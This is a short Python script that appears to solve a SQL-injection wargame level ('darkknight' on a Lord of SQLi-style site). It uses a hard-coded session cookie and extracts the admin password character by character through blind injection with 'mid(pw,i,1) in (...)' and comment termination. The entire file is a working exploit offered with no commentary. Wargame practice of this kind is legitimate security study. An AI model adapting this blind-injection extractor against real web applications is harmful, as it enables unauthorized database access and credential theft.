import requests
import re


cookie = {'PHPSESSID': 'hldutc71r5b68a3e2nvveko752'}

url = 'https://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no=-1 '

cmp = "Hello admin"

passchars = '0123456789abcdefghijklmnopqrstuvwxyz'


dbname= ""

#Password is
for i in range(1, 10):
    for j in passchars:
        query = url + ' or (id LIKE "a%" and mid(pw,' + str(i) + ',1) in ("' + j + '")' + ')-- -'
        req = requests.get(query, cookies=cookie)
        res=req.text
        tmp = re.findall(cmp, res)
        if tmp:
            dbname += j
            break
print "Password is : " + dbname
        